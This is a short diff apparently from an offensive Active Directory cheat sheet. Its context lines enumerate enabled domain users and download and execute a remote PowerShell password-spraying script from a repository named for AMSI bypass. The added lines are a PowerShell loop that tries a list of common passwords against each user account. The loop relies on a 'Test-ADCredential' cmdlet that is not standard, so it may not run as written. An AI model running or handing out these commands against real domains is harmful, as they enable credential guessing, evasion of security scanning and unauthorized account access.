@@ -612,6 +612,25 @@ Get-ADUser -Filter 'Enabled -eq $true' |
     Out-File "$env:USERPROFILE\Desktop\Enabled_ADUsers.txt" -Encoding UTF8
 
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/main/dpspray.ps1');dpspray
+```
+
+```
+$UserList = @("user1","user2","user3")
+$PasswordList = @("Password123","Summer2025!","Welcome1")
+
+foreach ($user in $UserList){
+    foreach ($pass in $PasswordList){
+        try {
+            $cred = New-Object System.Management.Automation.PSCredential($user,(ConvertTo-SecureString $pass -AsPlainText -Force))
+            $result = Test-ADCredential -Credential $cred
+            if ($result){
+                Write-Output "Success: $user : $pass"
+            }
+        } catch {
+            Write-Output "Failed: $user : $pass"
+        }
+    }
+}
 
 ```
 
